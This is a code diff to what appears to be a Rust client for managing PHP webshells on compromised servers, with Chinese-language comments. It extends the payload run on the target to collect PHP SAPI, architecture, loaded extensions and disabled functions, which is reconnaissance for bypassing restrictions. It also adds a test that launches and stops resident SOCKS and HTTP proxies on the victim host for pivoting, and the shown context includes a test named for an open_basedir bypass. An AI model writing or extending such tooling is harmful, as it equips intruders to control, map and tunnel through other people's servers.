@@ -262,6 +262,18 @@ impl PhpProtocol {
             current_dir: get("current_dir"),
             separator: get("separator"),
             message: "分阶段载荷探测成功。".to_string(),
+            php_sapi: get("php_sapi"),
+            arch: get("arch"),
+            extensions: value
+                .pointer("/data/extensions")
+                .and_then(|v| v.as_array())
+                .map(|a| {
+                    a.iter()
+                        .filter_map(|v| v.as_str().map(String::from))
+                        .collect()
+                })
+                .unwrap_or_default(),
+            disable_functions: get("disable_functions"),
         })
     }
 
@@ -748,7 +760,7 @@ impl Protocol for PhpProtocol {
             return self.session_probe(&php, settings);
         }
         let code = format!(
-            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR));{}",
+            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>php_uname('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>(string)ini_get('disable_functions')));{}",
             Self::build_prefix(encoder, &profile.password),
             TEMPLATE_FRAME
         );
@@ -788,6 +800,26 @@ impl Protocol for PhpProtocol {
             .and_then(|v| v.as_str())
             .unwrap_or("/")
             .to_string();
+        let php_sapi = value
+            .pointer("/data/php_sapi")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let arch = value
+            .pointer("/data/arch")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let extensions = value
+            .pointer("/data/extensions")
+            .and_then(|v| v.as_array())
+            .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
+            .unwrap_or_default();
+        let disable_functions = value
+            .pointer("/data/disable_functions")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
 
         Ok(ProbeResult {
             status: "online".to_string(),
@@ -797,6 +829,10 @@ impl Protocol for PhpProtocol {
             current_dir,
             separator,
             message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
+            php_sapi,
+            arch,
+            extensions,
+            disable_functions,
         })
     }
 
@@ -2291,6 +2327,61 @@ except Exception as e:
     with open(outfile, "w") as f:
         f.write("ERR: " + str(e))
 "#;
+
+    #[test]
+    fn real_php_proxy_start_stop() {
+        // Socks/HTTP 代理：start（后台驻留）→ stop（pid 文件 kill）闭环
+        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
+            return;
+        };
+        let settings = settings();
+        let mut profile1 = profile(&url);
+        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            // Socks：start
+            let port = 18000 + (std::process::id() % 500) as u32;
+            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"port": port}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
+            let pid = out["pid"].as_u64().unwrap_or(0);
+            assert!(pid > 0, "后台驻留应返回子进程 pid：{out:?}");
+            eprintln!("[proxy] socks start pid={pid}");
+            std::thread::sleep(std::time::Duration::from_millis(300));
+            // Socks：stop
+            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"port": port, "action": "stop"}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
+            assert_eq!(out["stopped"].as_bool(), Some(true), "应成功停止代理：{out:?}");
+            eprintln!("[proxy] socks stop 成功");
+            // HTTP：start + stop
+            let hport = port + 1;
+            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"port": hport}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
+            eprintln!("[proxy] http start pid={}", out["pid"].as_u64().unwrap_or(0));
+            std::thread::sleep(std::time::Duration::from_millis(300));
+            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"port": hport, "action": "stop"}), &settings)?;
+            assert_eq!(out["stopped"].as_bool(), Some(true), "应成功停止 HTTP 代理：{out:?}");
+            eprintln!("[proxy] http stop 成功");
+            // 连接信息丰富：probe 应带回 SAPI/扩展/禁用函数
+            let probe = PhpProtocol.session_probe(php, &settings).unwrap_or_else(|_| {
+                panic!("probe 应成功")
+            });
+            assert!(!probe.php_sapi.is_empty(), "SAPI 应探测到");
+            assert!(!probe.extensions.is_empty(), "扩展列表应非空");
+            eprintln!("[info] sapi={} arch={} extensions={} disable={}",
+                probe.php_sapi, probe.arch, probe.extensions.len(), probe.disable_functions);
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("代理开关真实执行应成功：{error}"));
+    }
 
     #[test]
     fn real_php_open_basedir_bypass() {
